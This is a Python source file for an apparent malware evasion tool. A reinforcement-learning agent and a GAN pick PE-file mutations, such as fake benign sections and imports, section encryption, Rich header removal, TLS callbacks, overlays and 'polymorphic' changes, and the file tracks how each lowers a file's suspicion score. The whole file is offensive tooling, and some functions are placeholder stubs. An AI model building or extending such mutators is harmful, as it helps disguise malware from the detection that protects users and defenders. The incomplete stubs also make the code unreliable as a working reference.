"""
Main Mutator - Orchestrates PE mutations using RL and GAN
"""

import random
from pathlib import Path
from typing import Dict, Any, List, Optional
import sys
sys.path.append(str(Path(__file__).parent.parent))

from core.pe_manipulator import PEManipulator, BENIGN_DLLS, BENIGN_FUNCTIONS, BENIGN_SECTION_NAMES
from core.rl_agent import PPOAgent
from core.gan_generator import GANGenerator
from utils.pe_parser import PEParser


class MalwareMutator:
    """Main mutator class that orchestrates mutations"""
    
    def __init__(self, use_rl: bool = True, use_gan: bool = True):
        """
        Initialize mutator
        
        Args:
            use_rl: Use RL agent for action selection
            use_gan: Use GAN for generating components
        """
        self.use_rl = use_rl
        self.use_gan = use_gan
        
        if use_rl:
            self.rl_agent = PPOAgent()
        
        if use_gan:
            self.gan_generator = GANGenerator()
    
    def mutate(self, input_file: str, output_file: str, iterations: int = 100,
               techniques: Optional[List[str]] = None) -> Dict[str, Any]:
        """
        Mutate PE file
        
        Args:
            input_file: Input PE file path
            output_file: Output PE file path
            iterations: Number of mutation iterations
            techniques: Specific techniques to use (None = all)
            
        Returns:
            Mutation report
        """
        print(f"[*] Starting mutation of {input_file}")
        print(f"[*] Iterations: {iterations}")
        print(f"[*] RL: {self.use_rl}, GAN: {self.use_gan}")
        
        # Parse original file
        with PEParser(input_file) as parser:
            original_features = parser.extract_all_features()
        
        print(f"[*] Original file entropy: {original_features.get('file_entropy', 0):.2f}")
        print(f"[*] Original suspicion score: {original_features.get('suspicion_score', 0)}")
        
        # Load PE manipulator
        manipulator = PEManipulator(input_file)
        
        # Track mutations
        applied_mutations = []
        
        # Perform mutations
        for i in range(iterations):
            # Get current state
            current_features = self._get_current_features(manipulator)
            
            # Select action
            if self.use_rl:
                action_idx, action_name, log_prob, value = self.rl_agent.select_action(current_features)
            else:
                if techniques:
                    action_name = random.choice(techniques)
                else:
                    action_name = random.choice(PPOAgent.ACTIONS)
            
            # Apply mutation
            success = self._apply_mutation(manipulator, action_name)
            
            if success:
                applied_mutations.append(action_name)
                print(f"[+] Iteration {i+1}/{iterations}: Applied {action_name}")
            else:
                print(f"[-] Iteration {i+1}/{iterations}: Failed to apply {action_name}")
        
        # Save mutated file
        print(f"[*] Saving mutated file to {output_file}")
        manipulator.save(output_file)
        
        # Parse mutated file
        with PEParser(output_file) as parser:
            mutated_features = parser.extract_all_features()
        
        print(f"[*] Mutated file entropy: {mutated_features.get('file_entropy', 0):.2f}")
        print(f"[*] Mutated suspicion score: {mutated_features.get('suspicion_score', 0)}")
        
        # Generate report
        report = {
            'input_file': input_file,
            'output_file': output_file,
            'iterations': iterations,
            'applied_mutations': applied_mutations,
            'mutation_count': len(applied_mutations),
            'original_features': original_features,
            'mutated_features': mutated_features,
            'entropy_change': mutated_features.get('file_entropy', 0) - original_features.get('file_entropy', 0),
        }
        
        print(f"[✓] Mutation complete! Applied {len(applied_mutations)} mutations")
        
        return report
    
    def _get_current_features(self, manipulator: PEManipulator) -> Dict[str, Any]:
        """Get current PE features (simplified)"""
        # In production, would re-parse the PE
        # For now, return basic info
        return manipulator.get_info()
    
    def _apply_mutation(self, manipulator: PEManipulator, action: str) -> bool:
        """
        Apply specific mutation
        
        Args:
            manipulator: PE manipulator
            action: Action name
            
        Returns:
            True if successful
        """
        try:
            if action == 'add_section':
                return self._add_section(manipulator)
            
            elif action == 'add_import':
                return self._add_import(manipulator)
            
            elif action == 'modify_timestamp':
                return manipulator.modify_timestamp()
            
            elif action == 'inject_code_cave':
                return self._inject_code_cave(manipulator)
            
            elif action == 'add_overlay':
                return self._add_overlay(manipulator)
            
            elif action == 'modify_entry_point':
                return manipulator.modify_entry_point()
            
            elif action == 'encrypt_section':
                return self._encrypt_section(manipulator)
            
            elif action == 'add_resource':
                return self._add_resource(manipulator)
            
            elif action == 'modify_section_characteristics':
                return self._modify_section_characteristics(manipulator)
            
            elif action == 'remove_rich_header':
                return manipulator.remove_rich_header()
            
            elif action == 'add_tls_callback':
                return self._add_tls_callback(manipulator)
            
            elif action == 'modify_checksum':
                return manipulator.modify_checksum()
            
            elif action == 'add_padding':
                return self._add_padding(manipulator)
            
            elif action == 'obfuscate_strings':
                return self._obfuscate_strings(manipulator)
            
            elif action == 'polymorphic_mutation':
                return self._polymorphic_mutation(manipulator)
            
            else:
                return False
                
        except Exception as e:
            print(f"Error applying {action}: {e}")
            return False
    
    def _add_section(self, manipulator: PEManipulator) -> bool:
        """Add benign section"""
        if self.use_gan:
            name = self.gan_generator.generate_section_name()
            size = random.randint(512, 4096)
            data = self.gan_generator.generate_section_data(size)
        else:
            name = random.choice(BENIGN_SECTION_NAMES)
            size = random.randint(512, 4096)
        
        return manipulator.add_section(name, size)
    
    def _add_import(self, manipulator: PEManipulator) -> bool:
        """Add benign import"""
        dll = random.choice(BENIGN_DLLS)
        
        if self.use_gan:
            functions = self.gan_generator.generate_import_names(dll, random.randint(2, 5))
        else:
            if dll in BENIGN_FUNCTIONS:
                functions = random.sample(BENIGN_FUNCTIONS[dll], min(3, len(BENIGN_FUNCTIONS[dll])))
            else:
                functions = ['DummyFunction']
        
        return manipulator.add_import(dll, functions)
    
    def _inject_code_cave(self, manipulator: PEManipulator) -> bool:
        """Inject benign code into code cave"""
        # NOP sled
        code = bytes([0x90] * random.randint(10, 50))
        return manipulator.inject_code_cave(code)
    
    def _add_overlay(self, manipulator: PEManipulator) -> bool:
        """Add overlay data"""
        size = random.randint(100, 1000)
        data = bytes([random.randint(0, 255) for _ in range(size)])
        return manipulator.add_overlay(data)
    
    def _encrypt_section(self, manipulator: PEManipulator) -> bool:
        """Encrypt a section"""
        # Get random section
        sections = list(manipulator.binary.sections)
        if not sections:
            return False
        
        section = random.choice(sections)
        key = bytes([random.randint(0, 255) for _ in range(16)])
        
        return manipulator.encrypt_section(section.name, key)
    
    def _add_resource(self, manipulator: PEManipulator) -> bool:
        """Add resource"""
        resource_type = random.randint(1, 24)
        resource_id = random.randint(1, 100)
        data = bytes([random.randint(0, 255) for _ in range(random.randint(100, 500))])
        
        return manipulator.add_resource(resource_type, resource_id, data)
    
    def _modify_section_characteristics(self, manipulator: PEManipulator) -> bool:
        """Modify section characteristics"""
        sections = list(manipulator.binary.sections)
        if not sections:
            return False
        
        section = random.choice(sections)
        # Keep it executable/readable/writable
        characteristics = 0xE0000020
        
        return manipulator.modify_section_characteristics(section.name, characteristics)
    
    def _add_tls_callback(self, manipulator: PEManipulator) -> bool:
        """Add TLS callback"""
        callback_rva = random.randint(0x1000, 0x10000)
        return manipulator.add_tls_callback(callback_rva)
    
    def _add_padding(self, manipulator: PEManipulator) -> bool:
        """Add padding to sections"""
        sections = list(manipulator.binary.sections)
        if not sections:
            return False
        
        section = random.choice(sections)
        padding = bytes([0x00] * random.randint(100, 500))
        
        try:
            content = list(section.content)
            section.content = content + list(padding)
            return True
        except:
            return False
    
    def _obfuscate_strings(self, manipulator: PEManipulator) -> bool:
        """Obfuscate strings (simplified)"""
        # In production, would actually find and encrypt strings
        # For now, just add some random data
        return self._add_padding(manipulator)
    
    def _polymorphic_mutation(self, manipulator: PEManipulator) -> bool:
        """Apply polymorphic mutation"""
        # Combine multiple techniques
        success = False
        success |= self._add_section(manipulator)
        success |= self._add_import(manipulator)
        success |= manipulator.modify_timestamp()
        
        return success
    
    def load_rl_model(self, filepath: str):
        """Load trained RL model"""
        if self.use_rl:
            self.rl_agent.load(filepath)
            print(f"[✓] Loaded RL model from {filepath}")
    
    def load_gan_model(self, section_path: str, import_path: str):
        """Load trained GAN models"""
        if self.use_gan:
            self.gan_generator.load(section_path, import_path)
            print(f"[✓] Loaded GAN models")
